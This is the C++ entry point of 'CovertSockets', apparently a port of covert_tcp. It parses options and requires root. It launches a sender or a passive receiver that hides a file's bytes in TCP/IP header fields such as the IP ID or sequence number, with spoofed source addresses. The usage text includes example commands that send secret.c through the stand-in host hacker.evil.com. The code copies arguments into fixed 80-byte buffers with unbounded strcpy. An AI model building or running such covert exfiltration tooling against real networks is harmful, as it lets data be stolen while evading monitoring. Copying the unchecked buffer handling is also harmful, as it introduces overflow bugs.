#include<iostream>
#include <zconf.h>
#include <cstring>
#include <dnet.h>

#include "utils/argparser.h"
#include "endpoints/EndpointFactory.h"

using namespace std;

/* Generic resolver from unknown source */
unsigned int host_convert(const char *hostname)
{
    static struct in_addr i;
    struct hostent *h;
    i.s_addr = inet_addr(hostname);
    if(i.s_addr == -1)
    {
        h = gethostbyname(hostname);
        if(h == NULL)
        {
            fprintf(stderr, "cannot resolve %s\n", hostname);
            exit(0);
        }
        bcopy(h->h_addr, (char *)&i.s_addr, h->h_length);
    }
    return i.s_addr;
} /* end resolver */

/* Tell them how to use this */
void usage(char *progname)
{
    printf("Covert TCP usage: \n%s -dest dest_ip -source source_ip -file filename -source_port port -dest_port port -server [encode type]\n\n", progname);
    printf("-dest dest_ip      - Host to send data to.\n");
    printf("-source source_ip  - Host where you want the data to originate from.\n");
    printf("                     In SERVER mode this is the host data will\n");
    printf("                     be coming FROM.\n");
    printf("-source_port port  - IP source port you want data to appear from. \n");
    printf("                     (randomly set by default)\n");
    printf("-dest_port port    - IP source port you want data to go to. In\n");
    printf("                     SERVER mode this is the port data will be coming\n");
    printf("                     inbound on. Port 80 by default.\n");
    printf("-file filename     - Name of the file to encode and transfer.\n");
    printf("-server            - Passive mode to allow receiving of data.\n");
    printf("[Encode Type] - Optional encoding type\n");
    printf("-ipid - Encode data a byte at a time in the IP packet ID. [DEFAULT]\n");
    printf("-seq  - Encode data a byte at a time in the packet sequence number.\n");
    printf("-ack  - DECODE data a byte at a time from the ACK field.\n");
    printf("        This ONLY works from server mode and is made to decode\n");
    printf("        covert channel packets that have been bounced off a remote\n");
    printf("        server using -seq. See documentation for details\n");
    printf("\nPress ENTER for examples.");
    getchar();
    printf("\nExample: \ncovert_tcp -dest foo.bar.com -source hacker.evil.com -source_port 1234 -dest_port 80 -file secret.c\n\n");
    printf("Above sends the file secret.c to the host hacker.evil.com a byte \n");
    printf("at a time using the default IP packet ID encoding.\n");
    printf("\nExample: \ncovert_tcp -dest foo.bar.com -source hacker.evil.com -dest_port 80 -server -file secret.c\n\n");
    printf("Above listens passively for packets from  hacker.evil.com\n");
    printf("destined for port 80. It takes the data and saves the file locally\n");
    printf("as secret.c\n\n");
    exit(0);
} /* end usage() */


int main(int argc, char * argv[]){

    cout << "CovertSockets - Initalizing" << endl;

    /* Can they run this? */
    if(geteuid() !=0){
        cout << "You Need To Be Root To Run This. Aborting" << endl;
        return 1;
    }

    /* Tell them how to use this thing */
    if((argc < 6) || (argc > 13))
    {
        usage(argv[0]);
        exit(0);
    }

    ArgParcer arguments;

    //lets parse some parameters
    unsigned int source_host = 0;
    unsigned int dest_host = 0;
    unsigned short source_port = (unsigned short)arguments.GetTagVal("-source_port", argv, argc, 0);
    unsigned short dest_port = (unsigned short)arguments.GetTagVal("-dest_port", argv, argc, 80);
    int ipid= arguments.GetTagVal("-ipid", argv, argc, 0);
    int seq= arguments.HasTagVal("-seq", argv, argc) ? 1: 0;
    int ack= arguments.HasTagVal("-ack", argv, argc) ? 1:0;
    int server= arguments.HasTagVal("-server", argv, argc) ? 1: 0;

    int file=0;
    char filename[80];
    if(arguments.HasTagVal("-file", argv, argc)){
        file = 1;
        string fn = arguments.GetTagData("-file", argv, argc);
        cout << "Got File Name. It Is: >" << fn << "<" << endl;
        strcpy(filename,fn.c_str());
        cout << "Moved File Name To Char. It Is Now: >" << filename << "<" << endl;
    }

    char srchost[80];
    if(arguments.HasTagVal("-source", argv, argc)){

        source_host=host_convert(arguments.GetTagData("-source", argv, argc).c_str());

        string sh = arguments.GetTagData("-source", argv,argc);
        strcpy(srchost,sh.c_str());
    }

    char desthost[80];
    if(arguments.HasTagVal("-dest", argv, argc)){

        dest_host = host_convert(arguments.GetTagData("-dest", argv, argc).c_str());

        string dh = arguments.GetTagData("-dest", argv, argc);
        strcpy(desthost, dh.c_str());
    }

    int usettl = arguments.HasTagVal("-usettl", argv,argc) ? 1: 0;
    int usesp = arguments.HasTagVal("-usesp", argv, argc) ? 1 : 0;
    int usedp = arguments.HasTagVal("-usedp", argv, argc) ? 1: 0;
    int usewin = arguments.HasTagVal("-usewin", argv, argc) ? 1: 0;

    int useack = arguments.HasTagVal("-useack", argv, argc) ? 1: 0;
    int usetos = arguments.HasTagVal("-usetos", argv, argc) ? 1: 0;
    int usesrc = arguments.HasTagVal("-usesrc", argv, argc) ? 1: 0;
    int useflags = arguments.HasTagVal("-useflags", argv,argc) ? 1: 0;


    // Do Some Parameter Validation

    /* check the encoding flags */
    if(ipid+seq+ack+usettl+usesp+usedp+usewin+useack+usetos+usesrc+useflags == 0)

        ipid=1; /* set default encode type if none given */

    else if (ipid+seq+ack+usettl+usesp+usedp+usewin+useack+usetos+usesrc+useflags !=1)
    {
        cout << "Only One Encoding/ Decoding Flag Can Be Used At A Time" << endl;
        return 1;
    }
    /* Did they give us a filename? */
    if(file != 1)
    {
        cout << "A File Name Is Required To Transfer Data (-file <filename>)" << endl;
        return 1;
    }

    //Create A Configuration Struct
    Configuration configuration;

    configuration.dest_host = dest_host;
    configuration.dest_port = dest_port;
    strncpy(configuration.desthost,desthost, strlen(desthost));
    configuration.source_host = source_host;
    configuration.source_port = source_port;
    strncpy(configuration.srchost, srchost, strlen(srchost));


    const char * fn = filename;
    strncpy(configuration.filename, fn, strlen(fn));
    cout << "Copied FileName to Struct. It Is Now: >" << configuration.filename << "<" << endl;


    configuration.ack = ack;
    configuration.seq = seq;
    configuration.ipid = ipid;
    configuration.useack = useack;
    configuration.usedp = usedp;
    configuration.usesp = usesp;
    configuration.useflags = useflags;
    configuration.usesrc = usesrc;
    configuration.usetos = usetos;
    configuration.usettl = usettl;
    configuration.usewin = usewin;

    //Generate Us An Endpoint Appropriate To The Settings
    EndpointFactory * ef = new EndpointFactory(configuration);

    //Execute The Endpoint
    IEndpoint * endpoint = ef->getEndpoint(server);
    if(endpoint == nullptr){
        cout << "Covert Socket: There Was An Error Fetching The Endpoint. Aborting" << endl;
        return 1;
    }
    endpoint->setConfiguration(configuration);
    endpoint->execute();

    delete(endpoint);
    delete(ef);

    return 0;
}